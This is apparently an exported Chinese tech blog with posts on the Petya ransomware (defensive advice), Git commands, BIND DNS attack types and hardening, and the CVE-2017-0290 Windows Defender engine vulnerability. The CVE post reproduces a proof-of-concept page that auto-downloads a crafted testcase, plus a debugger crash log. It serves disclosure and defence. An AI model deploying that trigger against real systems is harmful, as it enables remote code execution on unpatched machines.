{"meta":{"title":"Netb2c's Blog","subtitle":"We'd better struggle for the future rather than regret for the past.","description":"Life & Work Essays.","author":"Netb2c","url":"http://blog.unixmen.cn"},"pages":[{"title":"","date":"2017-03-03T06:54:20.000Z","updated":"2017-03-03T06:54:20.000Z","comments":true,"path":"404.html","permalink":"http://blog.unixmen.cn/404.html","excerpt":"","text":"","raw":null,"content":null},{"title":"About","date":"2017-02-15T08:36:30.000Z","updated":"2017-03-06T06:54:49.000Z","comments":true,"path":"about/index.html","permalink":"http://blog.unixmen.cn/about/index.html","excerpt":"","text":"Netb2c Nickname: netb2c Position: DevOps Email: netb2c(a)linux.cn Blog: http://blog.unixmen.cn Github:netb2c","raw":null,"content":null},{"title":"第一篇博客","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T03:47:05.000Z","comments":true,"path":"第一篇博客/index.html","permalink":"http://blog.unixmen.cn/第一篇博客/index.html","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null}],"posts":[{"title":"勒索病毒袭Petya预警","slug":"勒索病毒袭Petya预警","date":"2017-06-29T02:50:41.000Z","updated":"2017-06-29T02:56:59.000Z","comments":true,"path":"2017/06/29/勒索病毒袭Petya预警/","link":"","permalink":"http://blog.unixmen.cn/2017/06/29/勒索病毒袭Petya预警/","excerpt":"","text":"近日，代号为Petya的新一轮勒索病毒袭击了俄罗斯、英国、乌克兰等多个国家，机场、银行及大型企业被报告感染病毒，目前中国国内也已有用户中招。据报道，本轮病毒比之前的WannaCry勒索病毒更专业、更难对付。 病毒加密硬盘，勒索比特币新勒索病毒Petya不仅对文件进行加密，而且直接将整个硬盘加密、锁死，在出现以下界面并瘫痪后，其会自动向局域网内部的其它服务器及终端进行传播。Petya勒索病毒感染的电脑： 同时，用户的电脑开机后则会黑屏，并显示勒索信。信中称，用户想要解锁，需要向黑客的账户转折合300美元的比特币。 勒索信息： 与之前病毒相比，威胁升级这种攻击手法十分类似于曾在上个月肆虐全球的勒索病毒，不过看起来比当时的勒索病毒更加专业、也更难以对付。 1.Petya勒索病毒变种的传播速度更快。在欧洲国家重灾区，新病毒变种的传播速度达到每10分钟感染5000余台电脑，多家运营商、石油公司、零售商、机场、ATM机等企业和公共设施已大量沦陷，甚至乌克兰副总理的电脑也遭到感染。 2.感染并加密本地文件的病毒进行了更新，杀毒软件除非升级至最新版病毒库，否则无法查杀及阻止其加密本机文件系统； 3.Petya综合利用了“5.12WannaCry”及“6.23勒索病毒新变种”所利用的所有Windows系统漏洞，包括MS17-010（5.12WannaCry永恒之蓝勒索病毒）及CVE-2017-8543/CVE-2017-8464（6.23勒索病毒新变种）等补丁对应的多个系统漏洞进行传播。 4.Petya直接将整个硬盘加密和锁死，用户重启后直接进入勒索界面，若不支付比特币将无法进入系统。 防止感染，立刻这样设置电脑 不要轻易点击不明附件，尤其是rtf、doc等格式文件。 内网中存在使用相同账号、密码情况的机器请尽快修改密码，未开机的电脑请确认口令修改完毕、补丁安装完成后再进行开机操作。 更新操作系统补丁（MS）https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 更新 Microsoft Office/WordPad 远程执行代码漏洞（CVE -2017-0199）补丁 https://technet.microsoft.com/zh-cn/office/mt465751.aspx 禁用 WMI服务https://zhidao.baidu.com/question/91063891.htmlWMI（Windows Management Instrumentation Windows 管理规范）是一项核心的Windows管理技术，你可以通过如下方法停止： I. 在服务页面开启WMI服务。在开始-运行，输入services.msc，进入服务。或者，在控制面板，查看方式选择大图标，选择管理工具，在管理工具中双击服务。II.在服务页面，按W，找到WMI服务，找到后，双击 ，直接点击停止服务即可，如下图所示： 6.更新杀毒软件目前，市面上主流的杀毒软件与电脑保护软件均有插件或程序，可以绝大程度上保护电脑不受新型勒索病毒感染。用户只需在软件内搜索Petya，或到其官网搜索修复工具即可。 7.提高用户安全意识 I. 限制管理员权限Petya勒索病毒的运行需要管理员权限，企业网管可以通过严格审查限制管理员权限的方式减少攻击面，个人用户可以考虑使用非管理员权限的普通账号登陆进行日常操作。II. 关闭系统崩溃重启Petya勒索病毒的“发病”需要系统重启，因此想办法避免系统重启也能有效防御Petya并争取漏洞修补或者文件抢救时间。只要系统不重新启动引导，病毒就没有机会加密MFT主文件分区表，用户就有机会备份磁盘中的文件（微软官方教程）。III. 备份重要数据重要文件进行本地磁盘冷存储备份，以及云存储备份。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"勒索病毒","slug":"技术文档/勒索病毒","permalink":"http://blog.unixmen.cn/categories/技术文档/勒索病毒/"},{"name":"安全","slug":"技术文档/勒索病毒/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/勒索病毒/安全/"}],"tags":[{"name":"勒索病毒","slug":"勒索病毒","permalink":"http://blog.unixmen.cn/tags/勒索病毒/"},{"name":"petya","slug":"petya","permalink":"http://blog.unixmen.cn/tags/petya/"}]},{"title":"Git 入门及实践","slug":"Git-入门及实践","date":"2017-05-18T08:35:00.000Z","updated":"2017-06-08T08:55:03.000Z","comments":true,"path":"2017/05/18/Git-入门及实践/","link":"","permalink":"http://blog.unixmen.cn/2017/05/18/Git-入门及实践/","excerpt":"","text":"一、文章说明本文详细介绍git的基础操作及命令详解，并通过两个经典案例进行实践练习。 二、Git介绍：GIT （分布式版本控制系统）是 Linus Torvalds为了帮助管理Linux内核开发而开发的一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目，可以有效、高速的处理从很小到非常大的项目版本管理。 1、Git的功能特性： 从服务器上克隆完整的Git仓库（包括代码和版本信息）到单机上。 在自己的机器上根据不同的开发目的，创建分支，修改代码。 在单机上自己创建的分支上提交代码。 在单机上合并分支。 把服务器上最新版的代码fetch下来，然后跟自己的主分支合并。 生成补丁（patch），把补丁发送给主开发者。 看主开发者的反馈，如果主开发者发现两个一般开发者之间有冲突（他们之间可以合作解决的冲突），就会要求他们先解决冲突，然后再由其中一个人提交。如果主开发者可以自己解决，或者没有冲突，就通过。 2、Git工作流程介绍： Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 3、Git的优点： 适合分布式开发，强调个体。 公共服务器压力和数据量都不会太大。 速度快、灵活。 任意两个开发者之间可以很容易的解决冲突。 离线工作。 4、Git的缺点： 资料少（起码中文资料很少）。 学习周期相对而言比较长。 不符合常规思维。 代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息。 三、Git安装git 是一跨平台的分布式版本控制系统，我们如何开始呢？下面介绍在多平台下的安装方法。 1、Linux 平台 基于Redhat的衍生分支 1yum install git-all 基于Debian的衍生分支 1apt-get install git-all 2、Mac系统安装Mac系统下有几种安装方式: 最简单的方式是Xcode Command Line Tools，在OSX10.9或更高的系统版本，你只需要在终端运行一下git命令，如果没有安装git，系统将自动为你安装。 如果你想安装更新的版本，可以在Git官方网站下载由官方维护的 OSX Git 安装程序，网址为 http://git-scm.com/download/mac 在Mac系统下也可以安装图形化Git工具，你可以在git官方网站上下载安装程序，网址为：https://central.github.com/deployments/desktop/desktop/latest/darwin，下载git-osx-installer到本机后进行手动安装。 3、Windows 安装git在 Windows 上安装 Git 也有几种安装方法。官方版本可以在 Git 官方网站下载。 打开http://git-scm.com/download/win，下载会自动开始。如果你想安装更新的版本，可以在Git官方网站下载由官方维护的 windows Git 安装程序可以访问https://central.github.com/deployments/desktop/desktop/latest/win32?format=msi进行下载，然后安装。 四、Git基础操作命令介绍本节详细介绍了git常用命令及基础操作方法 1、新建代码库 在当前目录新建一个Git代码库 1git init 新建一个目录，将其初始化为Git代码库 1git init [project-name] 下载一个项目和它的整个代码历史 1git clone [url] 2、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 显示当前的Git配置 1git config --list 编辑Git配置文件 1git config -e [--global] 设置提交代码时的用户信息 12git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot; 3、增加/删除文件 添加指定文件到暂存区 1git add [file1] [file2] ... 添加指定目录到暂存区，包括子目录 1git add [dir] 添加当前目录的所有文件到暂存区 1git add . 添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交 1git add -p 删除工作区文件，并且将这次删除放入暂存区 1git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区 1git rm --cached [file] 改名文件，并且将这个改名放入暂存区 1git mv [file-original] [file-renamed] 4、代码提交 提交暂存区到仓库区 1git commit -m [message] 提交暂存区的指定文件到仓库区 1git commit [file1] [file2] ... -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 1git commit -a 提交时显示所有diff信息 1git commit -v 使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息 1git commit --amend -m [message] 重做上一次commit，并包括指定文件的新变化 1git commit --amend [file1] [file2] ... 5、分支 列出所有本地分支 1git branch 列出所有远程分支 1git branch -r 列出所有本地分支和远程分支 1git branch -a 新建一个分支，但依然停留在当前分支 1git branch [branch-name] 新建一个分支，并切换到该分支 1git checkout -b [branch] 新建一个分支，指向指定commit 1git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 1git branch --track [branch] [remote-branch] 切换到指定分支，并更新工作区 1git checkout [branch-name] 切换到上一个分支 1git checkout - 建立追踪关系，在现有分支与指定的远程分支之间 1git branch --set-upstream [branch] [remote-branch] 合并指定分支到当前分支 1git merge [branch] 选择一个commit，合并进当前分支 1git cherry-pick [commit] 删除分支 1git branch -d [branch-name] 删除远程分支 12git push origin --delete [branch-name]git branch -dr [remote/branch] 6、标签 列出所有tag 1git tag 新建一个tag在当前commit 1git tag [tag] 新建一个tag在指定commit 1git tag [tag] [commit] 删除本地tag 1git tag -d [tag] 删除远程tag 1git push origin :refs/tags/[tagName] 查看tag信息 1git show [tag] 提交指定tag 1git push [remote] [tag] 提交所有tag 1git push [remote] --tags 新建一个分支，指向某个tag 1git checkout -b [branch] [tag] 7、查看信息 显示有变更的文件 1git status 显示当前分支的版本历史 1git log 显示commit历史，以及每次commit发生变更的文件 1git log --stat 搜索提交历史，根据关键词 1git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 1git log [tag] HEAD --pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 1git log [tag] HEAD --grep feature 显示某个文件的版本历史，包括文件改名 12git log --follow [file]git whatchanged [file] 显示指定文件相关的每一次diff 1git log -p [file] 显示过去5次提交 1git log -5 --pretty --oneline 显示所有提交过的用户，按提交次数排序 1git shortlog -sn 显示指定文件是什么人在什么时间修改过 1git blame [file] 显示暂存区和工作区的差异 1git diff 显示暂存区和上一个commit的差异 1git diff --cached [file] 显示工作区与当前分支最新commit之间的差异 1git diff HEAD 显示两次提交之间的差异 1git diff [first-branch]...[second-branch] 显示今天你写了多少行代码 1git diff --shortstat &quot;@&#123;0 day ago&#125;&quot; 显示某次提交的元数据和内容变化 1git show [commit] 显示某次提交发生变化的文件 1git show --name-only [commit] 显示某次提交时，某个文件的内容 1git show [commit]:[filename] 显示当前分支的最近几次提交 1git reflog 8、远程同步 下载远程仓库的所有变动 1git fetch [remote] 显示所有远程仓库 1git remote -v 显示某个远程仓库的信息 1git remote show [remote] 增加一个新的远程仓库，并命名 1git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 1git pull [remote] [branch] 上传本地指定分支到远程仓库 1git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 1git push [remote] --force 推送所有分支到远程仓库 1git push [remote] --all 9、撤销 恢复暂存区的指定文件到工作区 1git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 1git checkout [commit] [file] 恢复暂存区的所有文件到工作区 1git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 1git reset [file] 重置暂存区与工作区，与上一次commit保持一致 1git reset --hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 1git reset [commit] 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 1git reset --hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 1git reset --keep [commit] 新建一个commit，用来撤销指定commit 后者的所有变化都将被前者抵消，并且应用到当前分支 1git revert [commit] 暂时将未提交的变化移除，稍后再移入 12git stashgit stash pop 10、其他 生成一个可供发布的压缩包1git archive 五、实例实践分享学习git的最好方式就是动手操作，在介绍完git基础操作后，通过两个典型实例进行进行实践，用以巩固学习git的基础操作。你可以在https://github.com上进行练习，也可以在我搭建的gitlab测试环境http://git.unixmen.cn/进行练习实践。下面是案例介绍，Enjoy it! 案例一：将现有文件夹加入到git远程仓库1、实例描述：将本地文件夹及文件夹中的内容加入到已有的远程仓库中。 2、操作步骤剖析：首先进入已存在的文件夹，然后对本地文件夹进行git初始化，接着添加远程仓库地址，将本地文件添加到本地缓存，然后确认，最后推送。 3、操作步骤详细介绍： 进入到已有文件夹 1cd _post 将现有目录文件夹进行初始化这将在当前目录下创建隐藏的文件夹.git，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。 1git init 添加远程git仓库以下为命令为添加远程仓库的方法，其中“origin” 为添加的远程仓库的短名字以方便记录。 1git remote add origin git@git.unixmen.cn:netb2c/blogs.git 将本地文件夹添加到跟踪 1git add . 提交描述信息 1git commit 将本地文件推送到远程仓库 1git push -u origin master 至此本案例操作完成，可通过web端查看项目提交结果，以上就是整个操作过程。 案例二：利用分支进行开发的工作流程1、案例描述：案例介绍利用git分支进行开发的工作流程的典型工作模式。 2、背景介绍：工作流程在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。Git 作为一个强大及方便易管源码管理系统，不可避免涉及到多人协作。协作必须有一个规范的工作流程，而工作流程有各式各样的用法，但也正因此使得在实际工作中如何上手使用变得很头大，让大家有效地合作，使得项目井井有条地发展下去。 3、利用分支进行开发的工作流程介绍： 长期分支 master 分支master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。 develop 分支开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。 短期分支 feature 分支如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为feature/bigchange，开发完成后合并回 develop 分支并且删除这个 feature 分支。相应的操作如下： 首先是新建分支 1git checkout -b feature/bigchange develop 然后开始写代码，提交，写代码，提交。。。然后直到feature 开发完成，合并回 develop，具体操作如下：接着切换到develop分支下1git checkout develop 然后开始合并，注：合并的时候务必加上 –no-ff，以保持分支的合并历史1git merge --no-ff feature/bigchange 最后删除这个分支1git branch -d feature/bigchange 如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下： 假设当前在 feature/bigchange 分支1git rebase develop rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。 release 分支当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为release/20170525，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。 相应操作如下：新建release分支 1git checkout -b release/20170525 develop 修复 bug、检查没问题后合并到 master 分支并删除12git checkout mastergit merge --no-ff release/20170525 为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支.响应操作如下：12git checkout developgit merge --no-ff release/20170525 到此，这个 release 分支完成了它的使命，可以被删除了1git branch -d release/20170525 hotfix 分支如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为hotfix/fix，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。 相应操作如下：新建分支 1git checkout -b hotfix/fix master 修完 bug 并测试完成后，分别与master和develop分支进行合并1234git checkout mastergit merge --no-ff hotfix/fixgit checkout developgit merge --no-ff hotfix/fix 然后可以删除分支1git branch -d hotfix/fix 例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。 proj 分支proj 分支为项目分支。所有的项目分支都从 master 上开出来，约定的分支名为proj/xxx。所有的项目定制内容都直接在项目分支上提交。为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。 相应操作如下：新建分支1git checkout -b proj/xxx master 定制。。。如果 master 分支有更新 12git checkout proj/xxx mastergit merge --no-ff master 至此本案例介绍完成，如果大家遵从这样的一个工作流程，相信大家都能成为一个高效的团队。 至此本文介绍完毕,如有问题及不足欢迎与我联络。 参考文献：http://baike.baidu.com/item/GIT/12647237 https://services.github.com/on-demand/downloads/github-git-cheat-sheet.pdf","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"},{"name":"git command","slug":"git-command","permalink":"http://blog.unixmen.cn/tags/git-command/"},{"name":"git 命令行","slug":"git-命令行","permalink":"http://blog.unixmen.cn/tags/git-命令行/"}]},{"title":"Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）","slug":"Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）","date":"2017-05-10T05:12:14.000Z","updated":"2017-05-10T05:14:22.000Z","comments":true,"path":"2017/05/10/Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）/","link":"","permalink":"http://blog.unixmen.cn/2017/05/10/Windows系统恶意软件防护引擎曝严重远程代码执行漏洞（CVE-2017-0290）/","excerpt":"","text":"文章简述微软昨天发布了一个安全公告——微软自家的恶意程序防护引擎出现高危安全漏洞。影响到包括MSE、Windows Defender防火墙等在内的产品，危害性还是相当严重的。微软当前已经提供了升级以修复漏洞，并表示没有证据表明攻击者已经利用该漏洞。 漏洞编号：CVE-2017-0290 漏洞危害程度：Critical，严重 漏洞概述：简单说来，当微软恶意程序防护引擎（Microsoft Malware Protection Engine）检测某个恶意构造的文件后，攻击者就能利用漏洞实现远程代码执行。成功利用该漏洞，攻击者就能在LocalSystem帐号安全上下文执行任意代码，并控制系统。 攻击者随后就能安装程序；查看、更改或删除数据；或者以完整的用户权限来构建新账户。 攻击者实际上有很多种方法让微软的恶意程序保护引擎扫描到恶意构建的文件，比如目标用户浏览某个网站的时候就能分发恶意部署文件，或者通过邮件信息、即时通讯消息——在实时扫描开启的情况下，甚至不需要用户打开这些文件，微软恶意程序防护引擎就会对其进行扫描。 影响范围：很多微软的反恶意程序产品都在使用微软恶意程序防护引擎。鉴于其中包含Windows 7/8/8.1/10/Server 2016中就默认安装的反恶意程序产品，该漏洞应该是非常严重。微软在其安全公告页面中列出了受影响产品，包括： Microsoft Forefront Endpoint Protection 2010Microsoft Endpoint ProtectionMicrosoft Forefront Security for SharePoint Service Pack 3Microsoft System Center Endpoint ProtectionMicrosoft Security EssentialsWindows Defender for Windows 7Windows Defender for Windows 8.1Windows Defender for Windows RT 8.1Windows Defender for Windows 10, Windows 10 1511, Windows 10 1607, Windows Server 2016, Windows 10 1703Windows Intune Endpoint Protection 漏洞详情：具体来说，MsMpEng是恶意程序防护服务，Windows 8/8.1/10/Server 2012等都默认启用。MSE（Microsoft Security Essentials）、系统中心终端防护和微软的各种安全产品都采用此核心引擎。 MsMpEng以AUTHORITY\\SYSTEM权限运行，无沙盒，通过Windows服务（如Exchange、IIS等）在无需身份认证的情况下可远程访问。 在工作站之上，攻击者给用户发送邮件（甚至不需要阅读邮件或打开附件）、在浏览器中访问链接、使用即时通讯等，就能访问mpengine（MsMpEng用于扫描和分析的核心组件）。因为MsMpEng采用文件系统minifilter来拦截以及检查所有的文件系统活动，所以给硬盘的任意位置写入相应内容就能实现mpengine中函数的访问。 鉴于其高权限、可访问及普遍存在性，MsMpEng中的这个漏洞还是极为严重的。 不难发现mpengine本身就是个很大的攻击面，其中包含很多专门的文件格式、可执行封装包、cryptor、完整系统模拟器的Handler，还有各种架构和语言的解释器。所有这些代码，远程攻击者都是可以访问的。 其中NScript是mpengine的一个组件，这个组件用于评估任意看起来像是JS的文件系统或网络活动。值得一提的是，这是个无沙盒环境、高权限的JavaScript interpreter——用于评估不受信任的代码。 谷歌的研究人员写了个工具，通过代码shell访问NScript。发现函数JsDelegateObject_Error::toString()会从中读取“message”属性，但在传递给JsRuntimeState::triggerShortStrEvent()之前未能验证属性类型。其默认假定message是个字符串，但实际上可以是任意类型。这就能够让攻击者传递其它任意对象。 更多详情可参见Chromium。其中也提供了漏洞再现的方法。 若要再现该漏洞，可点击这里下载：https://bugs.chromium.org/p/project-zero/issues/attachment?aid=283405 。访问包含下述代码的网站后，1234&lt;a href=&quot;testcase.txt&quot; download id=link&gt;&lt;script&gt;document.getElementById(&quot;link&quot;).click();&lt;/script&gt; 捕捉到的debug会话：123456789101112131415161718192021222324252627282930313233343536373: kd&gt; !processPROCESS 8805fd28 SessionId: 0 Cid: 0afc Peb: 7ffdf000 ParentCid: 01c8 DirBase: bded14e0 ObjectTable: bfb99640 HandleCount: 433. Image: MsMpEng.exe3: kd&gt; !token -n_EPROCESS 8805fd28, _TOKEN 00000000TS Session ID: 0User: S-1-5-18 (Well Known Group: NT AUTHORITY\\SYSTEM)3: kd&gt; .lasteventLast event: Access violation - code c0000005 (first chance) debugger time: Fri May 5 18:22:14.740 2017 (UTC - 7:00)3: kd&gt; reax=00000010 ebx=1156c968 ecx=41414141 edx=115730f8 esi=68bd9100 edi=41414141eip=68b1f5f2 esp=0208e12c ebp=0208e134 iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010293mpengine!FreeSigFiles+0xec822:001b:68b1f5f2 8b07 mov eax,dword ptr [edi] ds:0023:41414141=????????3: kd&gt; lmv mmpenginestart end module name68790000 6917a000 mpengine (export symbols) mpengine.dll Loaded symbol image file: mpengine.dll Image path: c:\\ProgramData\\Microsoft\\Microsoft Antimalware\\Definition Updates\\&#123;1C2B7358-645B-41D0-9E79-5FA3E5C4EB51&#125;\\mpengine.dll Image name: mpengine.dll Timestamp: Thu Apr 06 16:05:37 2017 (58E6C9C1) CheckSum: 00A1330D ImageSize: 009EA000 Translations: 0000.04b0 0000.04e4 0409.04b0 0409.04e43: kd&gt; umpengine!FreeSigFiles+0xec822:001b:68b1f5f2 8b07 mov eax,dword ptr [edi]001b:68b1f5f4 56 push esi001b:68b1f5f5 8b7008 mov esi,dword ptr [eax+8]001b:68b1f5f8 8bce mov ecx,esi001b:68b1f5fa ff15c0450e69 call dword ptr [mpengine!MpContainerWrite+0x35f3a0 (690e45c0)]001b:68b1f600 8bcf mov ecx,edi001b:68b1f602 ffd6 call esi &lt;--- Jump to attacker controlled address001b:68b1f604 5e pop esi 值得一提的是，在执行JS之前，mpengine采用各种启发式方案来决定是否有必要作评估。其中一个启发式方案会评估文件熵——不过研究人员发现其实只要附加上足够多的注释，也就能够触发所谓的“评估”过程了。 修复方案：微软在安全公告中提到，终端用户和企业管理员不需要进行额外的操作，微软恶意程序引擎本身自动检测和更新部署机制会在48小时内应用更新。具体更新时间，视所用软件、互联网连接和基建配置而定。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"Intel AMT 漏洞","slug":"Intel-AMT-漏洞","permalink":"http://blog.unixmen.cn/tags/Intel-AMT-漏洞/"}]},{"title":"全面提升BIND DNS服务器安全","slug":"全面提升BIND-DNS服务器安全","date":"2017-05-09T10:37:54.000Z","updated":"2017-05-10T09:51:38.000Z","comments":true,"path":"2017/05/09/全面提升BIND-DNS服务器安全/","link":"","permalink":"http://blog.unixmen.cn/2017/05/09/全面提升BIND-DNS服务器安全/","excerpt":"","text":"文章简介本文介绍了当前互联网DNS服务器所存在的隐患（几种典型的DNS攻击方式）及安全加固 DNS服务所面临的安全隐患互联网上DNS服务器的事实标准就是ISC的BIND，BillManning对in-addr域的调查发现，有95%的域名服务器(2的2000次方个服务器中)使用的是各种版本的“bind”。这其中包括了所有的DNS根服务器，而这些根服务器对整个服务器的正常运转起着至关重要的作用。 DNS服务所面临的安全隐患包括： DNS欺骗（DNSSpoffing） 拒绝服务（Denialofservice，DoS）攻击 分布式拒绝服务攻击（Distributed Denial of Service，DDoS） 缓冲区漏洞溢出攻击（BufferOverflow） 1.DNS欺骗DNS欺骗即域名信息欺骗是最常见的DNS安全问题。当一个DNS服务器掉入陷阱，使用了来自一个恶意DNS服务器的错误信息，那么该DNS服务器就被欺骗了。DNS欺骗会使那些易受攻击的DNS服务器产生许多安全问题，例如：将用户引导到错误的互联网站点，或者发送一个电子邮件到一个未经授权的邮件服务器。网络攻击者通常通过两种方法进行DNS欺骗。 （1）缓存感染黑客会熟练的使用DNS请求，将数据放入一个没有设防的DNS服务器的缓存当中。这些缓存信息会在客户进行DNS访问时返回给客户，从而将客户引导到入侵者所设置的运行木马的Web服务器或邮件服务器上，然后黑客从这些服务器上获取用户信息。 （2）DNS信息劫持入侵者通过监听客户端和DNS服务器的对话，通过猜测服务器响应给客户端的DNS查询ID。每个DNS报文包括一个相关联的16位ID号，DNS服务器根据这个ID号获取请求源位置。黑客在DNS服务器之前将虚假的响应交给用户，从而欺骗客户端去访问恶意的网站。 （3）DNS重定向攻击者能够将DNS名称查询重定向到恶意DNS服务器。这样攻击者可以获得DNS服务器的写权限。 2.拒绝服务攻击黑客主要利用一些DNS软件的漏洞，如在BIND9版本（版本9.2.0以前的9系列）如果有人向运行BIND的设备发送特定的DNS数据包请求，BIND就会自动关闭。攻击者只能使BIND关闭，而无法在服务器上执行任意命令。如果得不到DNS服务，那么就会产生一场灾难：由于网址不能解析为IP地址，用户将无方访问互联网。这样，DNS产生的问题就好像是互联网本身所产生的问题，这将导致大量的混乱。 3.分布式拒绝服务攻击DDOS攻击通过使用攻击者控制的几十台或几百台计算机攻击一台主机，使得服务拒绝攻击更难以防范：使服务拒绝攻击更难以通过阻塞单一攻击源主机的数据流，来防范服务拒绝攻击。SynFlood是针对DNS服务器最常见的分布式拒绝服务攻击。SYNFlood攻击利用的是IPv4中TCP协议的三次握手（Three-WayHandshake）过程进行的攻击。大家知道协议规定，如果一端想向另一端发起TCP连接，它需要首先发送TCPSYN包到对方，对方收到后发送一个TCPSYN+ACK包回来，发起方再发送TCPACK包回去，这样三次握手就结束了。我们把TCP连接的发起方叫作”TCP客户机（TCPClient）”，TCP连接的接收方叫作”TCP服务器（TCPServer）”。 值得注意的是在TCP服务器收到TCPSYNrequest包时，在发送TCPSYN+ACK包回TCP客户机前，TCP服务器要先分配好一个数据区专门服务于这个即将形成的TCP连接。一般把收到SYN包而还未收到ACK包时的连接状态成为半开连接（Half-openConnection）。在最常见的SYNFlood攻击中，攻击者在短时间内发送大量的TCPSYN包给受害者，这时攻击者是TCP客户机，受害者是TCP服务器。根据上面的描述，受害者会为每个TCPSYN包分配一个特定的数据区，只要这些SYN包具有不同的源地址（这一点对于攻击者来说是很容易伪造的）。这将给TCP服务器系统造成很大的系统负担，最终导致系统不能正常工作。 4.缓冲区漏洞溢出攻击黑客利用DNS服务器软件存在漏洞，比如对特定的输入没有进行严格检查，那幺有可能被攻击者利用，攻击者构造特殊的畸形数据包来对DNS服务器进行缓冲区溢出攻击。如果这一攻击成功，就会造成DNS服务停止，或者攻击者能够在DNS服务器上执行其设定的任意代码。例如,前一阵子针对Linux平台的BIND的攻击(e.g.Lionworm)程序,就是利用某些版本的BIND漏洞,取得root权限,一旦入侵完成之后,入侵者就可以完全控制整个相关的网络系统,影响非常严重。主要包括： （1）更改MX记录，造成邮件被截获、修改或删除。 （2）更改A记录，使您的WWW服务器的域名指向黑客的具有同样WWW内容的主机，诱使访问者登录，获取访问者的密码等相关信息。添加A记录，使黑客的主机拥有被相信的域名，以此来入侵通过启用域名信任机制的系统。 （3）利用这台主机作为攻击其他机器的“跳板”。 应对以上这些安全隐患方法有两个最有效的原则：1.选择安全没有缺陷的DNS版本：BIND主要分为三个版本： （1）v4，1998年多数UNIX捆绑的是BIND4，已经被多数厂商抛弃了，除了OpenBSD还在使用。OpenBSD核心人为BIND8过于复杂和不安全，所以继续使用BIND4。这样一来BIND8/9的很多优点都不包括在v4中。 （2）v8，就是如今使用最多最广的版本，其详细内容可以参阅“BIND8+域名服务器安全增强”http://security.nsfocus.com/showQueryL.asplibID=530 （3）v9，最新版本的BIND，全部重新写过，免费（但是由商业公司资助），BIND9在2000年十月份推出，根据调查v9版本的BIND是最安全的，它的最新安全版本在其官方网站：http://www.isc.org/下载下载源代码安装即可。例如使用Linux系统针对拒绝服务攻击只要将BIND9升级为版本9.2.1即可。 